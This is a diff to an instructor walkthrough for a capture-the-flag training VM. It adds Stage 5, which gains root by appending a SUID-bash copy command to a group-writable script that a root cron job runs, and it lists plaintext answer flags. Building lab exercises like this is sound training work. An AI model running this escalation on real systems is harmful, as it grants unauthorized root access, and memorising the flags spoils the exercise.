@@ -78,10 +78,24 @@ foothold — see `player-material/Getting-Started.md`).
    (also in `decrypt_notes.txt`) → `FFLAG:backup_pre_rotation_88c5`.
    `evidence/old_ticket.txt` has plaintext `FFLAG:ticket_closed_wontfix_19d7`.
 
-## Stage 5 — Linux privilege escalation (not implemented yet)
+## Stage 5 — Linux privilege escalation
 
-*(To be filled in once Phase 5 adds the mechanism. The player begins
-this stage as Linux `admin`, confirmed via the above.)*
+Full mechanism and rationale: `instructor-material/privesc-design.md`.
+Player begins this stage as Linux `admin` (confirmed above, no sudo).
+
+1. `ls -la /etc/cron.d/` → `admin-tools-cleanup`, runs as root every
+   minute, executing `/opt/admin-tools/cleanup.sh`.
+2. `ls -la /opt/admin-tools/cleanup.sh` → `root:admin`, mode `664`.
+   `id` shows `admin` is in group `admin`.
+3. Append a command and wait for the next minute's cron tick:
+   ```
+   echo 'cp /bin/bash /tmp/rootbash && chmod 4755 /tmp/rootbash' >> /opt/admin-tools/cleanup.sh
+   sleep 60
+   /tmp/rootbash -p -c 'id'
+   # uid=1002(admin) gid=110(admin) euid=0(root) groups=110(admin)
+   ```
+4. Clean up `/tmp/rootbash` when done (or run
+   `vm/scripts/reset-privesc.sh` between teams).
 
 ## Final artifact (Original Flag 5, 250 pts)
 
@@ -103,10 +117,12 @@ Decoys in `/root`: `old_evidence.enc` decrypts with `SnapshotKey-2023`
 
 ## Verified facts (not assumptions)
 
-- All of the above (Stages 1–4, final artifact decrypt) was run for
+- All of the above (Stages 1–5, final artifact decrypt) was run for
   real in this session: against the actual files for Stages 1–3, and
-  against the live, booted VM over HTTP + SSH for Stage 4 and the final
-  artifact. See `PROJECT-STATUS.md`'s Phase 3/4 sections for the exact
-  commands and output.
+  against the live, booted VM over HTTP + SSH for Stage 4, Stage 5, and
+  the final artifact — including a genuine `admin` → `euid=0` privilege
+  transition with no instructor `sudo` involved. See
+  `PROJECT-STATUS.md`'s Phase 3/4/5 sections for the exact commands and
+  output.
 - `./scripts/validate-flags.sh` passes all structural + decryption
   checks.
